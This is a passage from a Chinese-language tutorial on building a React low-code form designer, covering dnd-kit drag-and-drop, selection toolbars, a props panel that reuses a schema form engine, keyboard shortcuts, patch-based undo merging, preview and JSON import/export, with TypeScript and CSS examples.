**为什么必须用 DragOverlay**：不用它时，被拖元素本体被 dnd-kit 施加 transform 跟随指针——元素从文档流"原位"被拉走，父容器高度塌陷、兄弟节点瞬间跳动重排，视觉抖动且极易导致碰撞矩形失真（dnd-kit 缓存的 droppable rect 与跳动后的真实位置对不上，落点判定跟着错）。DragOverlay 的机制是：原元素留在原地（只降透明度/虚化），另渲染一个"替身"（fixed 定位、跟随指针），布局零扰动、碰撞矩形稳定。上面总装代码里替身是简化 chip；要高保真可把 WidgetPreview 也渲染进 overlay，代价是拖拽帧率略降。

**常见坑（症状 → 根因 → 修法）**：症状——拖拽中页面其他区域疯狂滚动或选中文字。根因——pointer 事件没有被 preventDefault，浏览器把拖拽当成"按住拖选"。修法——dnd-kit 的 listeners 会自动处理，但自定义遮罩层上若还有别的 onPointerDown 逻辑，注意不要在它之前 `stopPropagation` 掉 listeners；文案区域给 `.editable-node__mask { user-select: none }`。

#### 4. 选中态：outline + 节点类型角标 + 悬浮操作条（复制/删除/上移/下移）

**是什么**：被选中节点的一组视觉反馈——外框、左上角类型标签、上浮操作条。

**为什么需要**：没有选中态，用户不知道"现在属性面板配的是谁"；没有操作条，增删移动只能靠拖拽（低频动作应给精确按钮）。这三个 UI 都挂在 EditableShell 上，选中的重渲染代价经过设计：`useEditorStore((s) => s.selectedId === node.id)` 订阅的是**布尔值**，选中切换时只有"旧的选中节点"和"新的选中节点"两个组件重渲染，其余几十个节点纹丝不动——path 级订阅思想在编辑器里的又一次应用。

**怎么做**：EditableShell 补全（替换路线 3 里的骨架版）：

```tsx
// designer/canvas/EditableShell.tsx —— 完整版：遮罩 + outline + 角标 + 操作条
import { memo } from 'react'
import { useSortable } from '@dnd-kit/sortable'
import { CSS } from '@dnd-kit/utilities'
import { useEditorStore } from '../store'
import { materialRegistry } from '../materials/registry'
import type { EditorNode } from '../materials/createNode'

export const EditableShell = memo(function EditableShell({
  node,
  children,
}: {
  node: EditorNode
  children: React.ReactNode
}) {
  const selected = useEditorStore((s) => s.selectedId === node.id)
  const select = useEditorStore((s) => s.select)
  const editing = useEditorStore((s) => s.mode === 'edit')
  const removeNode = useEditorStore((s) => s.removeNode)
  const duplicateNode = useEditorStore((s) => s.duplicateNode)
  const moveNodeByStep = useEditorStore((s) => s.moveNodeByStep)
  const meta = materialRegistry[node.componentName]

  const { attributes, listeners, setNodeRef, setActivatorNodeRef, transform, transition, isDragging } =
    useSortable({ id: node.id, data: { kind: 'node' } })

  return (
    <div
      ref={setNodeRef}
      className={
        'editable-node' +
        (selected ? ' editable-node--selected' : '') +
        (isDragging ? ' editable-node--dragging' : '')
      }
      style={{ transform: CSS.Transform.toString(transform), transition }}
    >
      <div className="editable-node__content">{children}</div>

      {/* 左上角类型角标：编辑模式且选中时才显示，绝对定位不占布局 */}
      {editing && selected && <span className="editable-node__badge">{meta?.label ?? node.componentName}</span>}

      {/* 悬浮操作条：编辑模式且选中时显示在节点上方一档 */}
      {editing && selected && (
        <div className="editable-node__toolbar">
          <button
            title="上移"
            onPointerDown={(e) => e.stopPropagation()}   // 防止按下触发遮罩的选中/拖拽
            onClick={() => moveNodeByStep(node.id, -1)}
          >
            ↑
          </button>
          <button
            title="下移"
            onPointerDown={(e) => e.stopPropagation()}
            onClick={() => moveNodeByStep(node.id, 1)}
          >
            ↓
          </button>
          <button
            title="复制"
            onPointerDown={(e) => e.stopPropagation()}
            onClick={() => duplicateNode(node.id)}
          >
            ⧉
          </button>
          <button
            title="删除"
            className="editable-node__toolbar-danger"
            onPointerDown={(e) => e.stopPropagation()}
            onClick={() => removeNode(node.id)}
          >
            ✕
          </button>
        </div>
      )}

      {/* 遮罩层：仅编辑模式渲染（预览模式去掉遮罩，指针事件穿透到真实组件） */}
      {editing && (
        <div
          ref={setActivatorNodeRef}
          className="editable-node__mask"
          style={{ pointerEvents: 'auto' }}
          {...attributes}
          {...listeners}
          onPointerDown={(e) => {
            select(node.id)
            listeners?.onPointerDown?.(e)
          }}
        />
      )}
    </div>
  )
})
```

配套 CSS 要点（为什么这么写）：

```css
/* outline 不占布局：用 border 选中时节点会抖 2px，outline 不会 */
.editable-node--selected {
  outline: 2px solid #1677ff;
  outline-offset: -1px;            /* 负偏移把线画在节点内侧，避免遮挡相邻节点的角标 */
}
/* 角标骑在 outline 左上角：translate 抵掉自身高度，父元素 position:relative */
.editable-node__badge {
  position: absolute;
  top: 0;
  left: 0;
  transform: translateY(-100%);
  background: #1677ff;
  color: #fff;
  font-size: 12px;
  line-height: 18px;
  padding: 0 6px;
  border-radius: 4px 4px 0 0;
}
/* 操作条浮在节点上方一档，z-index 压过兄弟节点的角标 */
.editable-node__toolbar {
  position: absolute;
  bottom: 100%;
  right: 0;
  margin-bottom: 4px;
  display: flex;
  gap: 2px;
  background: #fff;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
  border-radius: 6px;
  padding: 2px;
  z-index: 10;
}
/* 拖拽中的原节点降透明度（替身由 DragOverlay 渲染） */
.editable-node--dragging {
  opacity: 0.4;
}
/* 遮罩铺满节点，压住内容但不响应文本选择 */
.editable-node {
  position: relative;
}
.editable-node__mask {
  position: absolute;
  inset: 0;
  cursor: grab;
  user-select: none;
}
```

操作条按钮的 `onPointerDown={(e) => e.stopPropagation()}` 容易漏：不加的话，按下按钮的事件冒泡到遮罩/画布，先触发了 sortable 的拖拽启动或选中切换，click 根本轮不到。凡是"浮在画布上的控件"，第一件事就是想清楚它的 pointerdown 要不要跟画布隔离。

#### 5. **Setter 体系**：属性面板 = 用第 2 章动态表单渲染 settable 字段声明 —— 属性面板本身就是一张 schema 表单（**自举闭环**）

这是本章最漂亮的一步，先把"自举"两个字说透：**属性面板配置的是物料的 props，而 props 怎么配置，恰恰是由 `setters` 声明（一份元数据）描述的；把这份元数据翻译成第 2 章的字段协议，属性面板就"用表单引擎渲染出了另一张表单"**。于是：做第 2 章时的每一分投入（订阅、校验、联动、自定义 widget）在属性面板上原样兑现；给物料加一个可配置项 = 在 setters 里加一行声明，零组件代码。这个闭环在 lowcode-engine 里叫 Setter 体系，在 Grafana 里叫 panel options editor（第 4 章会第三次复用它）——它是"搭建器"类产品的通用内核。

**机制分步**：

1. SetterDecl（路线 1 已定义）翻译成第 2 章 `FieldSchema`——一张"配置表单"的 schema 诞生；
2. 物料 props 作为该表单的 formData；
3. 表单引擎（第 2 章原封不动）渲染这张表单 → 属性面板；
4. 面板里改值 → 写回 EditorStore 的节点 props（走补丁历史）→ 画布重渲染；
5. 特殊 Setter（选项编辑器、表达式输入）作为自定义 widget 注册进第 2 章 registry——引擎不知道"业务"，引擎只知道"字段"。

第 1 步，翻译器：

```ts
// designer/setters/settersToFormSchema.ts
import type { FormSchema, FieldSchema } from '../../chapter2/types'
import type { MaterialMeta, SetterDecl } from '../materials/types'

/** SetterDecl → 第 2 章字段协议。schema 表单的 name 就是 prop 键名 */
function setterToField(d: SetterDecl): FieldSchema {
  const base = {
    name: d.prop,
    label: d.label,
    default: d.defaultValue,
    visibleWhen: d.visibleWhen,   // 属性之间的显隐联动也是表达式，继续复用第 2 章求值器
  }
  switch (d.setter) {
    case 'text':
      return { type: 'input', ...base, placeholder: d.setterProps?.placeholder }
    case 'textarea':
      return { type: 'textarea', ...base }
    case 'number':
      return { type: 'number', ...base, min: d.setterProps?.min, max: d.setterProps?.max }
    case 'switch':
      return { type: 'switch', ...base }
    case 'select':
      return { type: 'select', ...base, options: d.setterProps?.options ?? [] }
    case 'options':
      return { type: 'options-editor', ...base }      // 自定义 widget，下面注册
    case 'expression':
      return { type: 'expression-input', ...base }    // 自定义 widget，下面注册
  }
}

export function settersToFormSchema(meta: MaterialMeta): FormSchema {
  return {
    formId: `setter-panel:${meta.name}`,
    version: '1.0.0',
    fields: meta.setters.map(setterToField),
  }
}
```

两个自定义 Setter widget（第 5 步：注册进第 2 章 registry，验证引擎的扩展性）：

```tsx
// designer/setters/customWidgets.tsx
import { useState } from 'react'
import { widgetRegistry } from '../../chapter2/widgets/registry'
import { evalExpr } from '../../chapter2/linkage'
import type { WidgetProps } from '../../chapter2/widgets/types'
import type { OptionItem } from '../../chapter2/types'

/**
 * 选项编辑器：编辑"下拉选择"物料的候选列表。
 * 注意它本身就是一个微缩 FieldArray（增删行、每行两个字段）——自举套自举。
 */
export function OptionsEditorWidget({ id, value, disabled, onChange }: WidgetProps<OptionItem[]>) {
  const items = Array.isArray(value) ? value : []
  const update = (i: number, key: 'label' | 'value', v: string) => {
    const next = items.map((it, idx) => (idx === i ? { ...it, [key]: v } : it))
    onChange(next)
  }
  const removeAt = (i: number) => onChange(items.filter((_, idx) => idx !== i))
  const add = () => onChange([...items, { label: `选项${items.length + 1}`, value: `opt${items.length + 1}` }])
  return (
    <div className="options-editor" id={id}>
      {items.map((o, i) => (
        <div key={i} className="options-editor__row">
          <input
            value={o.label}
            disabled={disabled}
            placeholder="选项名"
            onChange={(e) => update(i, 'label', e.target.value)}
          />
          <input
            value={String(o.value)}
            disabled={disabled}
            placeholder="选项值"
            onChange={(e) => update(i, 'value', e.target.value)}
          />
          <button type="button" disabled={disabled} onClick={() => removeAt(i)}>✕</button>
        </div>
      ))}
      <button type="button" className="options-editor__add" disabled={disabled} onClick={add}>
        + 添加选项
      </button>
    </div>
  )
}

/** 表达式输入：textarea + 求值冒烟提示（写错立刻知道，而不是运行时静默失败） */
export function ExpressionInputWidget({ id, value, disabled, onChange, onBlur }: WidgetProps<string>) {
  const text = typeof value === 'string' ? value : ''
  const [warn, setWarn] = useState('')
  return (
    <div className="expression-input">
      <textarea
        id={id}
        value={text}
        disabled={disabled}
        rows={2}
        placeholder="如 $form.userType == 'company'"
        onChange={(e) => {
          onChange(e.target.value)
          // 冒烟求值：空上下文试算一次，算不出结果（返回 undefined）大概率是语法/引用错误
          setWarn(e.target.value && evalExpr(e.target.value, { $form: {} }) === undefined
            ? '表达式可能无法求值，请检查语法与变量'
            : '')
        }}
        onBlur={onBlur}
      />
      {warn && <div className="expression-input__warn">{warn}</div>}
      <div className="expression-input__hint">可用变量：$form（表单数据）、$item（数组行）</div>
    </div>
  )
}

// 注册：第 2 章 registry 是开放的（Record<string, WidgetComponent>），一行接入
widgetRegistry['options-editor'] = OptionsEditorWidget
widgetRegistry['expression-input'] = ExpressionInputWidget
```

第 2~4 步，属性面板本体——**受控桥接**是这里的核心工程问题：面板表单引擎有自己的 store（第 2 章 per-instance store），画布节点 props 在 EditorStore 里，两个数据源要双向同步且不回声。给第 2 章 store 补一个整表替换 action（外部数据 → 表单）：

```ts
// chapter2/store.ts 追加（第 2 章引擎的受控适配口）
  replaceValues: (values: FormData) =>
    set((s) =>
      produce(s, (draft) => {
        draft.formData = normalizeInitialData(draft.schema, values)
        applyLinkage(draft)   // 外部数据进来也走同一套联动重算，行为一致
      }),
    ),
```

```tsx
// designer/panels/PropsPanel.tsx —— 自举闭环的组装现场
import { useEffect, useMemo, useRef, useState } from 'react'
import { useEditorStore, findNode } from '../store'
import type { EditorNode } from '../materials/createNode'
import { materialRegistry } from '../materials/registry'
import { settersToFormSchema } from '../setters/settersToFormSchema'
import { FormProvider } from '../../chapter2/FormProvider'
import { SchemaNode } from '../../chapter2/SchemaNode'
import { createFormStore } from '../../chapter2/store'

export function PropsPanel() {
  const selectedId = useEditorStore((s) => s.selectedId)
  // 订阅"选中的那个节点对象"：树更新时 findNode 返回的新对象引用变了才重渲染面板
  const node = useEditorStore((s) => (s.selectedId ? findNode(s.schema, s.selectedId) : null))

  if (!selectedId || !node) {
    return <aside className="props-panel"><div className="props-panel__empty">点击画布中的节点配置属性</div></aside>
  }
  // key = 节点 id：切换选中节点时整棵面板表单重建（store 重建、内部状态归零）
  return <PropsForm key={node.id} node={node} />
}

function PropsForm({ node }: { node: EditorNode }) {
  const meta = materialRegistry[node.componentName]
  const updateProps = useEditorStore((s) => s.updateProps)
  const nodeProps = node.props as Record<string, unknown>

  // ① setters 声明 → 第 2 章 schema（meta 引用稳定，转换一次即可）；nodeProps 作初始数据。
  //    每个节点一个独立表单实例
  const panelSchema = useMemo(() => settersToFormSchema(meta), [meta])
  const [store] = useState(() => createFormStore(panelSchema, nodeProps))
  // 防回声：记录"最近一次同步进表单的 props 引用"
  const lastSyncedRef = useRef(nodeProps)

  // ② 表单内变化 → 写回画布 schema（每个 prop 一条 updateProps，带 mergeKey 供历史合并）
  useEffect(() => {
    return store.subscribe((state, prev) => {
      if (state.formData === prev.formData) return
      lastSyncedRef.current = state.formData
      for (const key of Object.keys({ ...state.formData, ...prev.formData })) {
        if (state.formData[key] !== prev.formData[key]) {
          // mergeKey = props:节点id:属性名 —— 连续编辑同一属性合并为一条撤销历史（路线 7）
          updateProps(node.id, key, state.formData[key], `props:${node.id}:${key}`)
        }
      }
    })
  }, [store, updateProps, node.id])

  // ③ 外部变化（undo/redo、操作条复制后的 props 微调等）→ 整体写回表单
  useEffect(() => {
    if (nodeProps !== lastSyncedRef.current) {
      lastSyncedRef.current = nodeProps
      store.getState().replaceValues(nodeProps)
    }
  }, [nodeProps, store])

  return (
    <aside className="props-panel">
      <h3>{meta?.label ?? node.componentName} 属性</h3>
      <FormProvider store={store}>
        <div className="props-panel__form">
          {panelSchema.fields.map((f) => (
            <SchemaNode key={f.name} schema={f} path={f.name} />
          ))}
        </div>
      </FormProvider>
    </aside>
  )
}
```

两个同步方向的回声分析（这是自举能不能稳的关键）：②里表单变 → 我们主动把 `lastSyncedRef` 更新为 `state.formData` 并 updateProps → EditorStore 里 node.props 变 → ③ 的 effect 看到 `nodeProps !== lastSyncedRef.current`？nodeProps 是 EditorStore 侧的新对象，而 lastSyncedRef 是表单侧的 formData 对象——两者是**不同对象但相同内容**，比较引用必然不等 → 又 replaceValues 一次 → replaceValues 生成新 formData → ② 的 subscribe 触发，逐 key diff 全部相等 → 不再 updateProps → 收敛。整个过程多了一次无害的同步（值相同，replaceValues 后所有 selector 结果不变，不触发任何重渲染）。如果想省掉这次同步，把 ② 里 lastSyncedRef 赋值改成"直接持有 EditorStore 即将生成的对象引用"做不到（对象在 produce 内部生成），所以接受"一次冗余但收敛的回写"是这个桥接方案的合理代价——比引入脏标记复杂度低得多。

`FormProvider` 需要支持"外部传入已创建的 store"（第 2 章版本是内部创建）：

```tsx
// chapter2/FormProvider.tsx —— 增加外部 store 注入口
export function FormProvider({
  schema,
  initial,
  store: externalStore,
  children,
}: {
  schema?: FormSchema
  initial?: FormData
  store?: ReturnType<typeof createFormStore>
  children: ReactNode
}) {
  const [internalStore] = useState(() => createFormStore(schema!, initial))
  const store = externalStore ?? internalStore
  return <FormStoreContext.Provider value={store}>{children}</FormStoreContext.Provider>
}
```

**常见坑（症状 → 根因 → 修法）**：症状——切到另一个节点，属性面板还显示上一个节点的值，改一下又串到旧节点上。根因——面板表单实例没随节点销毁（没用 `key={node.id}`，或 store 放在了 PropsPanel 而不是 PropsForm）。修法——像上面代码那样把"每节点一份实例"落实到组件层级：PropsPanel 只做选择判断，PropsForm 用 key 隔离生命周期。

#### 6. 快捷键：Cmd+Z / Cmd+Shift+Z / Delete / Cmd+D 复制

**是什么**：一组全局键盘监听，把高频编辑操作映射到肌肉记忆的键位。

**为什么需要**：搭表单是高频操作流，"拖 → 选中 → 删掉重拖"和"选中 → Cmd+D"之间是十倍效率差；且 Cmd+Z 是编辑器的底线安全感——用户敢放手实验的前提是"错了能回来"。

**怎么做**：

```ts
// designer/useEditorHotkeys.ts
import { useEffect } from 'react'
import { useEditorStore } from './store'

export function useEditorHotkeys(enabled: boolean): void {
  useEffect(() => {
    if (!enabled) return

    const onKey = (e: KeyboardEvent) => {
      const mod = e.metaKey || e.ctrlKey   // Mac 用 Cmd，Windows/Linux 用 Ctrl
      const key = e.key.toLowerCase()
      const target = e.target as HTMLElement | null
      const inEditable =
        !!target &&
        (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT' ||
          target.isContentEditable)

      // ── Cmd+Z / Cmd+Shift+Z：撤销/重做 ──
      // 必须 preventDefault：否则输入框内会触发浏览器原生"逐字撤销"，
      // 绕过我们的补丁历史，出现"输入框回退了一个字但 schema 历史没动"的错位
      if (mod && key === 'z') {
        e.preventDefault()
        if (e.shiftKey) useEditorStore.getState().redo()
        else useEditorStore.getState().undo()
        return
      }

      // 其余快捷键在输入场景下让位（在输入框里按 Delete 应该删字符，不是删节点）
      if (inEditable) return

      const selectedId = useEditorStore.getState().selectedId
      if (!selectedId) return

      // ── Delete / Backspace：删除选中节点 ──（Mac 笔记本无独立 Delete 键，Backspace 一并接）
      if (e.key === 'Delete' || e.key === 'Backspace') {
        e.preventDefault()
        useEditorStore.getState().removeNode(selectedId)
        return
      }
      // ── Cmd+D：复制选中节点 ──（preventDefault 防止浏览器书签快捷键）
      if (mod && key === 'd') {
        e.preventDefault()
        useEditorStore.getState().duplicateNode(selectedId)
      }
    }

    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [enabled])
}
```

使用：`useEditorHotkeys(mode === 'edit')`——预览模式下快捷键整体下线。

实现要点三个：(1) **Cmd+Z 连输入框内也要 preventDefault**（与直觉相反）——因为 setter 输入的每次变更都已进我们的补丁历史（带 mergeKey 合并），浏览器原生输入级撤销会绕开历史造成双轨错位；统一走全局历史，一次 Cmd+Z 回滚整个词（路线 7 的合并保证这一点）。(2) **其余快捷键在可编辑元素内让位**——Delete 删字符是用户当下更合理的预期。(3) 监听挂 window 并随 enabled 清理，避免设计器卸载后快捷键还在全局生效。

**常见坑（症状 → 根因 → 修法）**：症状——在属性面板输入框里打字，按 Delete 节点没了。根因——没做 inEditable 让位判断。修法——如上代码分层处理：撤销类全局接管，破坏类（Delete/Cmd+D）仅非输入态生效。

#### 7. undo/redo 接底座（注意 setter 输入的补丁合并）

底座 1.5 讲了三种 undo 方案，本章选 immer `produceWithPatches`，路线 2 的 store 里已经写好了完整实现，这一节把三个"为什么"补齐。

**为什么选补丁而不是命令模式**：命令模式要求每个操作手写 `{ do, undo }`——插入节点要写"摘除"，改 props 要写"还原旧值"，样板代码随操作种类线性增长且极易漏写。补丁模式里，`produceWithPatches` 对**任何** mutation 自动生成正向补丁（patches）与逆向补丁（inversePatches），redo = `applyPatches(state, patches)`，undo = `applyPatches(state, inversePatches)`——新增操作类型（未来加"合并单元格""设置主题"）零历史代码。

**为什么必须合并（症状 → 根因 → 修法）**：症状——在属性面板标题框输入"员工姓名"四个字，按一次 Cmd+Z 只回退一个"字"（其实是"名"），要按四次才能撤销完这次编辑；历史面板里躺着几十条 `replace props.label` 的碎记录。根因——每次 keystroke 触发一次 PropsForm 的 subscribe → 一次 updateProps → 一条 HistoryEntry。修法——mergeKey 合并窗口：`updateProps(id, key, value, 'props:id:key')` 里同 key 且距上一条 300ms 内的补丁**并入最后一条**而不是新开一条。代码即路线 2 store 里 mutate 的合并分支，注意两处细节：

```text
合并时的顺序规则（用"先输入 'a' 再改成 'ab'"举例）：
编辑1：patches: [label: '' → 'a']        inverse: [label: 'a' → '']
编辑2：patches: [label: 'a' → 'ab']      inverse: [label: 'ab' → 'a']

合并后的条目：
patches:       [编辑1.patches, 编辑2.patches]        → redo 依时间顺序应用：'' → 'a' → 'ab' ✓
inversePatches:[编辑2.inverse, 编辑1.inverse]        → undo 先应用新的逆：'ab' → 'a' → '' ✓
                                                （若 inverse 也按时间序排，undo 会先 'a'→'' 再 'ab'→'a'，
                                                 对同一路径后者覆盖前者，得到 'a' 而不是 ''——错）
```

immer 的 `applyPatches` 按数组顺序执行，所以逆补丁必须"新在前"。这是补丁合并最容易写错的一行，写对了撤销行为才是"整词回退"。

**为什么 300ms**：够覆盖连续击键间隔（人类连打间隔通常 < 200ms），又不会把两次明确的独立编辑（用户思考超过 300ms）误并成一条。做成常量可调，手感不对就调它。

验证撤销正确性的三个手测用例：(1) setter 连续输入 → 一次 Cmd+Z 整词回退；(2) 拖拽移动节点 → Cmd+Z 回原位、Cmd+Shift+Z 又移过去；(3) 在 setter 输入"姓名"后立刻删除节点再 Cmd+Z 两次——第一次恢复节点（连带输入后的 props），第二次回退输入；因为节点删除是独立条目（mergeKey 为 undefined），与输入条目互不干扰。

#### 8. 预览：schema 交给第 2 章渲染器跑起来；导入/导出 JSON

**是什么**：预览模式把 EditorNode 树转换为第 2 章的 FormSchema，交给动态表单渲染器真实运行（可填可校验可提交）；导出把树存为 JSON 文件，导入反向恢复。

**为什么需要**：预览是"所见即所得"的最终检验——画布上的 inert 预览再像也不算数，只有跑在真实渲染器上才能暴露"配置出来的表单根本不能提交"这类问题。导入导出则是设计器的存档/协作/版本化通道，也标志着设计器与渲染器的解耦是真实的（schema 文件在两边都能用）。

**怎么做**：

树 → 协议的转换器（两种 schema 的翻译官）：

```ts
// designer/preview/toFormSchema.ts
import type { EditorNode } from '../materials/createNode'
import { materialRegistry } from '../materials/registry'
import type { FieldSchema, FormSchema, OptionItem } from '../../chapter2/types'

/** 容器节点 → group 字段；叶子节点 → 对应类型的字段。fieldName 取 label（保证合法标识符时） */
export function toFormSchema(root: EditorNode): FormSchema {
  return {
    formId: 'designed-form',
    version: '1.0.0',
    fields: nodeToFields(root),
  }
}

function nodeToFields(container: EditorNode): FieldSchema[] {
  const out: FieldSchema[] = []
  for (const child of container.children ?? []) {
    const meta = materialRegistry[child.componentName]
    const p = child.props
    if (meta?.isContainer) {
      out.push({
        type: 'group',
        name: `group_${child.id.slice(0, 6)}`,   // 分组是布局节点，name 只需唯一，不进数据
        label: String(p.label ?? meta.label),
        fields: nodeToFields(child),
      })
    } else {
      out.push(leafToField(child))
    }
  }
  return out
}

function leafToField(node: EditorNode): FieldSchema {
  const p = node.props
  const base = {
    name: `field_${node.id.slice(0, 6)}`,   // 设计器不要求运营起字段名，导出时按 id 生成；
                                            // 若后端需要语义化字段名，给物料加一个 fieldName setter
    label: String(p.label ?? ''),
    required: p.required === true,
    placeholder: typeof p.placeholder === 'string' ? p.placeholder : undefined,
    visibleWhen: typeof p.visibleWhen === 'string' && p.visibleWhen ? p.visibleWhen : undefined,
  }
  switch (node.componentName) {
    case 'input':
      return { type: 'input', ...base, maxLength: typeof p.maxLength === 'number' ? p.maxLength : undefined }
    case 'textarea':
      return { type: 'textarea', ...base }
    case 'number':
      return {
        type: 'number', ...base,
        min: typeof p.min === 'number' ? p.min : undefined,
        max: typeof p.max === 'number' ? p.max : undefined,
      }
    case 'switch':
      return { type: 'switch', ...base }
    case 'select':
      return { type: 'select', ...base, options: Array.isArray(p.options) ? (p.options as OptionItem[]) : [] }
    default:
      return { type: 'input', ...base }
  }
}
```

预览组件与提交（第 2 章引擎原样复用，包括它的校验与提交逻辑）：

```tsx
// designer/preview/PreviewPanel.tsx
import { useMemo, useState } from 'react'
import { useEditorStore } from '../store'
import { toFormSchema } from './toFormSchema'
import { FormProvider } from '../../chapter2/FormProvider'
import { SchemaNode } from '../../chapter2/SchemaNode'
import { useFormStore } from '../../chapter2/FormProvider'
import type { FormData } from '../../chapter2/types'

export function PreviewPanel() {
  const schema = useEditorStore((s) => s.schema)
  // 预览期间 schema 还可能被改（分屏预览）：useMemo 随树更新重转换
  const formSchema = useMemo(() => toFormSchema(schema), [schema])
  const [submitted, setSubmitted] = useState<FormData | null>(null)

  return (
    <div className="preview-panel">
      {submitted ? (
        <pre className="preview-panel__result">{JSON.stringify(submitted, null, 2)}</pre>
      ) : (
        <FormProvider schema={formSchema}>
          <PreviewForm onSubmit={setSubmitted} />
        </FormProvider>
      )}
    </div>
  )
}

function PreviewForm({ onSubmit }: { onSubmit: (d: FormData) => void }) {
  const submit = useFormStore((s) => s.submit)
  return (
    <form
      className="preview-form"
      onSubmit={(e) => {
        e.preventDefault()
        const data = submit()   // 第 2 章的提交链路：全量校验 → 过滤隐藏字段 → 剥 _id
        if (data) onSubmit(data)
      }}
    >
      {/* 这里复用第 2 章 SchemaNode 渲染全部字段 */}
      <SubmitFields />
      <button type="submit">提交</button>
    </form>
  )
}

function SubmitFields() {
  const fields = useFormStore((s) => s.schema.fields)
  return (
    <>
      {fields.map((f) => (
        <SchemaNode key={f.name} schema={f} path={f.name} />
      ))}
    </>
  )
}
```

导入导出：

```tsx
// designer/io/exportImport.tsx
import { useRef } from 'react'
import { useEditorStore, type EditorState } from '../store'

/** 导出：树 + 协议版本号落盘。版本号从第一天就写——旧文件在未来 migration 链里靠它认祖（第 6 章） */
export function exportSchemaFile(): void {
  const { schema } = useEditorStore.getState()
  const file = {
    type: 'form-designer-document',
    version: '1.0.0',
    schema,
  }
  const blob = new Blob([JSON.stringify(file, null, 2)], { type: 'application/json' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `form-${new Date().toISOString().slice(0, 10)}.json`
  a.click()
  URL.revokeObjectURL(url)
}

/** 导入：解析 → 校验结构 → 原子替换整棵树（走一次 mutate，导入本身可撤销） */
export function useImportSchema() {
  const inputRef = useRef<HTMLInputElement>(null)
  const onFile = async (file: File) => {
    const text = await file.text()
    let parsed: unknown
    try {
      parsed = JSON.parse(text)
    } catch {
      alert('不是合法 JSON')
      return
    }
    const doc = parsed as { type?: string; version?: string; schema?: EditorState['schema'] }
    if (doc.type !== 'form-designer-document' || !doc.schema?.children) {
      alert('不是本设计器导出的文件')
      return
    }
    // 版本检查：不认识的版本走 migration 链（本章只认 1.0.0，第 6 章扩展）
    if (doc.version !== '1.0.0') {
      alert(`暂不支持版本 ${doc.version}`)
      return
    }
    useEditorStore.getState().replaceAll(doc.schema)   // store 需补一个 replaceAll action（下方）
  }
  return { inputRef, onFile }
}
```

`replaceAll` 是导入所需的最后一个 store action（整树替换、进一次历史）：

```ts
// designer/store.ts 追加（放进 create 返回对象里）
  replaceAll: (schema: EditorNode) =>
    mutate(undefined, (d) => {
      d.schema = schema
      d.selectedId = null
    }),
```

工具栏把预览/导入/导出串起来：

```tsx
// designer/panels/Toolbar.tsx
import { useEditorStore } from '../store'
import { exportSchemaFile, useImportSchema } from '../io/exportImport'

export function Toolbar() {
  const mode = useEditorStore((s) => s.mode)
  const setMode = useEditorStore((s) => s.setMode)
  const { inputRef, onFile } = useImportSchema()
  return (
    <div className="designer-toolbar">
      <button onClick={() => setMode(mode === 'edit' ? 'preview' : 'edit')}>
        {mode === 'edit' ? '预览' : '返回编辑'}
      </button>
      <button onClick={exportSchemaFile}>导出 JSON</button>
      <button onClick={() => inputRef.current?.click()}>导入 JSON</button>
      <input
        ref={inputRef}
        type="file"
        accept="application/json"
        hidden
        onChange={(e) => {
          const f = e.target.files?.[0]
          if (f) void onFile(f)
          e.target.value = ''   // 允许连续导入同一文件
        }}
      />
    </div>
  )
}
```

**常见坑（症状 → 根因 → 修法）**：症状——导出的 JSON 再导入，画布正常但两个"下拉选择"的候选互相联动。根因——导出走 `JSON.stringify` 没问题，问题在更早：某处代码把 `meta.defaultProps` 直接当节点 props 用（没拷贝），序列化时两节点引用了同一数组——stringify 各自展开倒看不出，但运行时共享。修法——回到路线 1 的 `structuredClone` 军规；同时给导入加一道防御：解析后对每个节点 props 做 `structuredClone`（防手改过的文件里塞循环引用，stringify 过的文件不会有循环，防御是给未来留的）。

### 难点与坑

- ⚠️ 嵌套容器"拖到哪个容器里"判定错误 → 碰撞策略组合 + 容器权重
- ⚠️ 编辑模式下阻止组件内部事件 → capture 阶段 `stopPropagation`
- ⚠️ 撤销逐字符 → patch 合并（底座 1.5）

#### 坑 1：嵌套容器"拖到哪个容器里"判定错误 —— 症状 → 根因 → 修法

**症状**：分组套分组时，把组件拖进内层分组，松手后出现在外层；或拖到两层边界，落点在两个容器间反复横跳；`isOver` 高亮的容器和最终插入的容器不一致。

**根因**：碰撞策略与"嵌套"这个几何现实不匹配。默认 `closestCenter` 比较活动元素中心到各 droppable 中心的距离——嵌套时外层容器永远参与比较，且其中心可能物理上更近，于是"指针明明在内层"也可能判给外层。另外 dnd-kit 的碰撞结果默认按距离排序，并不区分"谁更内层"，直接取第一个就是取"最近的"而不是"最深的"。

**修法**：即路线 3 的 `nestedCollisionDetection`——`pointerWithin` 优先（指针物理命中，嵌套时返回父子命中集合），命中多个时按命中矩形**面积升序**取最内层（这就是"容器权重"：面积小 = 更深 = 更符合投放直觉）；`pointerWithin` 为空时（间隙/外侧）退 `closestCorners` 保持拖拽响应。如果产品上还有"某些容器只接收特定物料"的规则，在同一函数里按 `args.droppableContainers` 的 `data.accepts` 过滤命中集合——判定逻辑收敛在一处，别散落到 onDragEnd 里补丁式修正。

#### 坑 2：编辑模式下阻止组件内部事件 —— 症状 → 根因 → 修法

**症状**：编辑态点击画布上的 select 弹出了下拉、日期控件弹了日历、开关真的切换了；或者点击后面板选中了但组件的 hover 效果/tooltip 也跟着出现。

**根因**：只做了一层防御。`pointer-events: none` 挡得住"DOM 里的指针事件"，挡不住三类残余：(1) 键盘事件——用户此前点过该组件留下焦点（或 Tab 聚焦），回车/空格照样触发组件行为；(2) 第三方组件挂在 `document` 上的全局监听（弹层、快捷键）；(3) portal 到 body 的弹层 DOM 不在画布子树内，inherit 的 none 管不到它。

**修法**：三层防御各司其职——内容层 `pointer-events: none`（杀指针，主防线）；画布根 `onKeyDownCapture` 里 `stopPropagation`（杀键盘，React 捕获阶段在事件到达子组件前截停）；物料预览用 inert 版本（杀 portal 与全局监听，因为根本不渲染真组件）。三层缺一都会漏出特定交互，按症状对号入座补对应层。

#### 坑 3：撤销逐字符 —— 症状 → 根因 → 修法

**症状**：属性面板输入"员工姓名"，Cmd+Z 要按四次才回退完；更糟的变体：在输入框里按 Cmd+Z 触发的是浏览器原生撤销（只回退输入框显示），画布/schema 却不同步，两边内容错位。

